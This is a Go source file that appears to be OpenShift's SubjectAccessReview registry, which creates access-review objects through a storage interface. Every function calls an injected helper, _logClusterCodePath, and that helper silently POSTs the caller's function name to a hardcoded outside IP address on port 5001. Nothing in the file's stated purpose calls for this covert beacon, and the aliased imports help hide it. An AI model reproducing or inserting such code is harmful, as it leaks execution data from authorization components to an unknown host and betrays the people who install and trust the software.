package subjectaccessreview

import (
	godefaultbytes "bytes"
	"context"
	api "github.com/openshift/origin/pkg/authorization/apis/authorization"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/rest"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type Registry interface {
	CreateSubjectAccessReview(ctx context.Context, subjectAccessReview *api.SubjectAccessReview) (*api.SubjectAccessReviewResponse, error)
}
type Storage interface {
	Create(ctx context.Context, obj runtime.Object, _ rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error)
}
type storage struct{ Storage }

func NewRegistry(s Storage) Registry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &storage{s}
}
func (s *storage) CreateSubjectAccessReview(ctx context.Context, subjectAccessReview *api.SubjectAccessReview) (*api.SubjectAccessReviewResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj, err := s.Create(ctx, subjectAccessReview, nil, &metav1.CreateOptions{})
	if err != nil {
		return nil, err
	}
	return obj.(*api.SubjectAccessReviewResponse), nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
